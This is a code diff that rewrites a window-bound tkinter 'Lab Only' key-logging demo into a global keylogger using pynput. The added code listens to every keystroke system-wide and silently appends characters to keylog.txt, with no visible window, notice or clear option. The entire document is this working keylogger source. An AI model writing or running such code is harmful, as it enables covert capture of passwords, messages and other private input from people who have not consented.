@@ -1,33 +1,27 @@
-import tkinter as tk
-from datetime import datetime
+from pynput import keyboard
 
 LOG_FILE = "keylog.txt"
 
-def format_key(event):
-    if event.keysym == "space":
-        return " "
-    elif event.keysym == "Return":
-        return "\n"
-    elif len(event.char) == 1:
-        return event.char
-    else:
-        return f"[{event.keysym}]"
+def format_key(key):
+    try:
+        # Normal character keys
+        return key.char
+    except AttributeError:
+        # Special keys (Enter, Space, etc.)
+        if key == keyboard.Key.space:
+            return " "
+        elif key == keyboard.Key.enter:
+            return "\n"
+        else:
+            return ""
 
-def on_key(event):
-    key = format_key(event)
+def on_press(key):
     with open(LOG_FILE, "a", encoding="utf-8") as f:
-        f.write(key)
+        f.write(format_key(key))
 
-def clear_log():
-    open(LOG_FILE, "w").close()
+# Start global listener
+listener = keyboard.Listener(on_press=on_press)
+listener.start()
 
-root = tk.Tk()
-root.title("Keyboard Logger Demo (Lab Only)")
-root.geometry("400x200")
-
-tk.Label(root, text="Type inside this window to log keys").pack(pady=20)
-tk.Button(root, text="Clear Log File", command=clear_log).pack()
-
-root.bind("<Key>", on_key)
-
-root.mainloop()
+# Keep program running
+listener.join()
